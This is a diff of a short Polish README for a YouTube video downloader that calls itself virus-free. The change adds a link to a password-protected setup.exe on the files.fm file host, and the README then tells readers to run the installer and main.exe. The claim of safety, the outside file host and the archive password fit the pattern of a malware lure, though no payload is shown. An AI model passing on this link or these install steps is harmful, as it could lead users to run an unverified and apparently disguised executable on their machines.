@@ -3,7 +3,7 @@ Niezawirusowana aplikacja do pobierania wideo z YouTube
 
 ## Pobieranie
 
- 1. Pobierz plik **YT-downloader-setup.exe**
+ 1. Pobierz plik **YT-downloader-setup.exe (https://files.fm/u/jurqykwd9, hasło:yt1234)**
  2. Otwórz go i postępuj zgodnie z krokami
  3. Po instalacji utworzony zostanie **folder YT downloader**
  4. Wejdź w ww. folder i odnajdź plik **main.exe**
